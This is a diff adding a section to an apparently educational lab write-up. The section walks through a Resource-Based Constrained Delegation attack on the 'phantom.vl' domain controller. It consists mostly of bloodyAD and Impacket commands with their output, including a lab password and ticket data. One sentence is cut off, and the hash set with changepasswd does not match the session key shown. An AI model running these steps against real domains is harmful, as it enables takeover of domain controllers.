@@ -397,10 +397,89 @@ With `wsilva` now under our control, we now have delegated [AddAllowedToAct](Out
 
 **RBCD**
 
+Resource Based Constrained Delegation is one of a few delegation oriented kerberos attacks, though a legitimate kerberos process, it effectively allows a resource
 
+[The Hacker Recipes](https://www.thehacker.recipes/) has a brilliant [article](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) for our flavor of delegation.
 
+**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 add computer proxy proxypass`
 
+```
+Traceback (most recent call last):
+  File "/root/.local/bin/bloodyAD", line 7, in <module>
+    sys.exit(main())
+             ^^^^^^
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 216, in main
+    output = args.func(conn, **params)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 213, in computer
+    conn.ldap.bloodyadd(computer_dn, attributes=attr)
+  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 213, in bloodyadd
+    raise err
+msldap.commons.exceptions.LDAPAddException: LDAP Add operation failed on DN cn=proxy,CN=Computers,DC=phantom,DC=vl! Result code: "unwillingToPerform" Reason: "b'0000216D: SvcErr: DSID-031A126C, problem 5003 (WILL_NOT_PERFORM), data 0\n\x00'"
+```
+This is direct result of not checking our quota or `ms-DS-MachineAccountQuota:`, which we find to be 0.
 
+**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 get object 'DC=phantom,DC=vl' --attr ms-DS-MachineAccountQuota`
+```
+distinguishedName: DC=phantom,DC=vl
+ms-DS-MachineAccountQuota: 0
+```
+
+Instead, we'll have to reference work by [James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) on how to leverage a user account instead.
+
+Following the instructions, we need to add `wsilva` to `DC.PHANTOM.VL`'s  `msDS-AllowedToActOnBehalfOfOtherIdentity` which we can do with `bloodyAD`'s sub-module `rbcd`.
+
+**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 add rbcd DC$ wsilva`
+```
+[!] No security descriptor has been returned, a new one will be created
+[+] wsilva can now impersonate users on DC$ via S4U2Proxy
+```
+This effectively updates the attribute with our SID, allowing our user account to perform S4U2proxy to `DC.PHANTOM.VL`,
+which we can confirm with:
+**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 get object DC$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity --resolve-sd`
+```
+distinguishedName: CN=DC,OU=Domain Controllers,DC=phantom,DC=vl
+msDS-AllowedToActOnBehalfOfOtherIdentity.Owner: BUILTIN_ADMINISTRATORS
+msDS-AllowedToActOnBehalfOfOtherIdentity.Control: DACL_PRESENT|SELF_RELATIVE
+msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Type: == ALLOWED ==
+msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Trustee: wsilva
+msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Right: CONTROL_ACCESS
+msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.ObjectType: Self
+msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Flags: CONTAINER_INHERIT; OBJECT_INHERIT
+```
+
+With this in place, we need `wsilva`’s Ticket Granting Ticket (TGT) and its session key to manipulate the password hash.
+
+**Command:** `getTGT.py phantom.vl/wsilva:Summer2025 -dc-ip 10.129.234.63` and `export KRB5CCNAME=wsilva.ccache` to save it to our credential cache.
+```
+[*] Saving ticket in wsilva.ccache
+```
+
+The next step is **critical**, we must change `wsilva`’s Password Hash to the TGT Session Key, which will enable S4U2self + U2U without an SPN, completing our RBCD requirements.
+
+First we'll extract our session key from our TGT. 
+
+**Command:** `describeTicket.py wsilva.ccache` 
+```
+[*] Ticket Session Key            : 94c49d9c951a25276eefa5085c15070451b4ec61ed4d0f9f5681eb75a8777326
+[*] User Name                     : wsilva
+[*] User Realm                    : PHANTOM.VL
+[*] Service Name                  : krbtgt/PHANTOM.VL
+[*] Service Realm                 : PHANTOM.VL
+[*] Start Time                    : 17/10/2025 12:11:33 PM
+[*] End Time                      : 17/10/2025 22:11:33 PM
+[*] RenewTill                     : 18/10/2025 12:11:21 PM
+[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
+```
+
+Using `changepasswd.py` we can cleanly handle setting the password as a hash. Note that this will now make the user account unusable.
+**Command:** `changepasswd.py -newhashes 6c3573ab3a425e01ca61dacb45505c8ebd384fe9756594b04fa392741c324ee9 phantom.vl/wsilva@10.129.234.63`
+```
+[*] Changing the password of phantom.vl\wsilva
+[*] Connecting to DCE/RPC as phantom.vl\wsilva
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
 
 
 
